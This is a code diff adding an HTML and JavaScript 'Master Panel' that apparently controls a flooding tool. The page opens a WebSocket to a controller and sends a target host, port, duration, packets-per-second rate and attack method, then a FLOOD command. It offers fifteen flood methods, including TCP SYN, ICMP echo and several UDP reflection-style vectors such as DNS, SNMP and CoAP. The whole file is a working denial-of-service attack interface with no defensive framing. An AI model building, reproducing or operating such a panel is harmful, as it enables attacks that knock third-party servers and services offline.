@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Master Panel</title>
+	<script>
+	let socket;
+	let iscon=false;
+
+
+	function sleepb(ms) {
+		const start = Date.now();
+		while (Date.now() - start < ms);
+	}
+	function connect() {
+      		const url = document.getElementById("wsurl").value;
+
+		socket = new WebSocket(url);
+		socket.onopen = () => {
+			console.log("OPEN");
+			iscon=true;
+			updateConnectionStatus();
+		};
+		socket.onclose = () => {
+			console.log("OPEN");
+			iscon=false;
+			updateConnectionStatus();
+		};
+		socket.onerror = (error) => {
+			console.log("OPEN");
+			iscon=false;
+			updateConnectionStatus();
+		};
+
+	}
+	function stopcmd() {
+		const command = "ABORT\r\n";
+		if (socket && socket.readyState === WebSocket.OPEN) {
+			sleepb(100);
+			socket.send(command);
+			console.log("SEND  ", command);
+		} else {
+			console.log("ERROR SEND");
+		}
+	}
+
+	function sendcmd() {
+		const host = document.getElementById("host").value.trim();
+		const port = document.getElementById("port").value.trim();
+		const time = document.getElementById("time").value.trim();
+		const pps = document.getElementById("pps").value.trim();
+		const method = document.getElementById("method").value;
+
+		if (!host || !port || !time || !pps || !method) {
+			console.log("All fields!");
+			return;
+		}
+
+		const commands = [
+			`HOST ${host}\r\n`, 
+			`PORT ${port}\r\n`, 
+			`TIME ${time}\r\n`, 
+			`PPS ${pps}\r\n`, 
+			`METHOD ${method}\r\n`,
+			`FLOOD\r\n`
+		];
+
+		if (socket && socket.readyState === WebSocket.OPEN) {
+			commands.forEach(command => {
+			socket.send(command);
+			sleepb(100);
+			console.log("SEND  ", command);
+		});
+		} else {
+			console.log("ERROR SEND");
+		}
+	}
+	function updateConnectionStatus() {
+		const statusElement = document.getElementById("connection-status");
+		if (iscon) {
+			statusElement.textContent = "Connected";
+			statusElement.style.color = "Lime";
+		} else {
+			statusElement.textContent = "Disconnected (update page)";
+			statusElement.style.color = "red";
+		}
+	}
+	window.onload = () => {
+		connect();
+	}
+	</script>
+	<style>
+	:root {
+		--main-bg-color:	#010409;
+		--line-color:		Gray;
+		--text-color:		Snow;
+		--link-color:		Azure;
+		--log-entry-color:	#707070;
+		--ipd-hover-color:	#909090;
+		--ipd-hover-bcolor:	#202020;
+		--ipd-bcolor:		black;
+		--tit-border-color:	#5d5d5d;
+		--log-entry-a-color:	MediumSeaGreen;
+		--log-entry-recv-color:	SteelBlue;
+		--log-entry-type-color:	GoldenRod;
+	}
+
+	* {
+		padding:		0;
+		margin:			0;
+		box-sizing:		border-box;
+	}
+
+
+	.header_container {
+		max-width:		900px;
+		padding:		1rem;
+		font-size:		16px;
+		display:		flex;
+	}
+
+
+	.header_container>a {
+		text-decoration:	none;
+		color:			var(--text-color);
+	}
+
+
+	body {
+		background-color:	var(--main-bg-color);
+		font-family:		monospace;
+		font-size:		14px;
+		color:			var(--text-color);
+	}
+
+
+	hr {
+		border:			none;
+		border-bottom:		1px solid var(--line-color);
+		max-width:		900px;
+		margin-left:		auto;
+		margin-right:		auto;
+	}
+
+
+	a {
+		text-decoration:	underline;
+		color:			var(--link-color);
+	}
+
+
+	header {
+		min-height:		5vh;
+		border-bottom:		1px solid var(--line-color);
+		align-items:		center;
+	}
+
+
+	.container {
+		max-width:		500px;
+		margin-left:		auto;
+		margin-right:		auto;
+		padding-top:		6rem;
+		padding-bottom:		6rem;
+		min-height:		30vh;
+	}
+
+
+
+	#recvSpan, #hostSpan, #hostSpan2,
+	#hostSpan3 {
+		display:		inline-block;
+	}
+
+
+	#recvSpan {
+		width:			150px;
+	}
+
+
+	#hostSpan {
+		width:			300px;
+	}
+
+
+	#ipd {
+		background:		Black;
+		width:			100%;
+		white-space:		nowrap;
+		overflow-x:		none;
+		display:		inline-block;
+		transition:		background 0.2s;
+	}
+
+
+	#ipd:hover {
+		color:			var(--ipd-hover-color);
+		background:		var(--ipd-hover-bcolor);
+	}
+
+
+	#tit {
+		text-align:		center;
+		border:			1px solid var(--tit-border-color);;
+	}
+
+
+	.log-entry {
+		color:			var(--log-entry-color);
+		text-decoration:	none;
+	}
+
+
+	.log-entry .received {
+		color:			var(--log-entry-recv-color);
+	}
+
+
+	.log-entry .type {
+		color:			Snow;
+
+	}
+
+	input {
+		background-color:	Black;
+		color:			Lime;
+		text-decoration:	underline;
+		transition:		color 0.2s;
+	}
+	input:hover {
+		color:			Red;
+		font-weight:		bold;
+	}
+
+	select {
+		background-color:	Black;
+		font-weight:		bold;
+		color:			Red;
+		text-decoration:	underline;
+		border:			none;
+		transition:		background 0.2s;
+		transition:		color 0.2s;
+	}
+
+	select:hover {
+		background-color:	Red;
+		color:			white;
+	}
+	select:focus {
+		outline:		none;
+		border:			none;
+	}
+	button {
+		background-color:	Black;
+		font-weight:		bold;
+		color:			Snow;
+		padding:		2px 30px;
+		border-color:		White;
+		border:			solid 1px;
+		cursor:			pointer;
+		transition:		color 0.2s;
+	}
+	button:hover {
+		color:			Red;
+	}
+	button:active {
+		background-color:	Red;
+	}
+
+	footer {
+		border-top:		1px solid var(--line-color);
+		min-height:		5vh;
+	}
+	</style>
+</head>
+<body>
+
+	<header>
+	</header>
+	<div class="container">
+		<div id="connection-status" style="font-size: 20px; font-weight: bold;">
+			Check connetion
+		</div>
+			<br>
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label>WebSocket URL: </label>
+					</span>
+				</span>
+				<input type="text" id="wsurl" value="ws://localhost:8080">
+			</div>
+		<br>
+		<hr>
+		<br>
+		<div id="log-entries">
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="host">host (ipv4 or dns)</label>
+					</span>
+				</span>
+				<input type="text" id="host">
+			</div>
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="port">port</label>
+					</span>
+				</span>
+				<input value="80" type="text" id="port">
+			</div>
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="time">time (in sec)</label>
+					</span>
+				</span>
+				<input value="10" type="text" id="time">
+			</div>
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="pps">pps (packet per second)</label>
+					</span>
+				</span>
+				<input value="500" type="text" id="pps">
+			</div>
+
+
+			<br>
+			<br>
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="method">method</label>
+					</span>
+				</span>
+				<select id="method">
+					<option value="">-- SELECTED --</option>
+					<option value="0">esp</option>
+					<option value="1">icmp echo</option>
+					<option value="2">ip empty</option>
+					<option value="3">tcp syn</option>
+					<option value="4">tcp tfo</option>
+					<option value="5">udp coapv2</option>
+					<option value="6">udp default</option>
+					<option value="7">udp dns</option>
+					<option value="8">udp snmp</option>
+					<option value="9">udp echo</option>
+					<option value="10">udp dvr</option>
+					<option value="11">udp sadp</option>
+					<option value="12">udp ard</option>
+					<option value="13">tcp http</option>
+					<option value="14">udp discord</option>
+				</select>
+				</div>
+				<br>
+				<br>
+				<hr>
+				<br>
+				<br>
+				<button onclick="sendcmd()">FLOOD</button>
+				<button onclick="stopcmd()">STOP</button>
+				<button onclick="connect()">CONNECT</button>
+			</div>
+		</div>
+	</div>
+
+	<footer>
+	</footer>
+</body>
+</html>
+
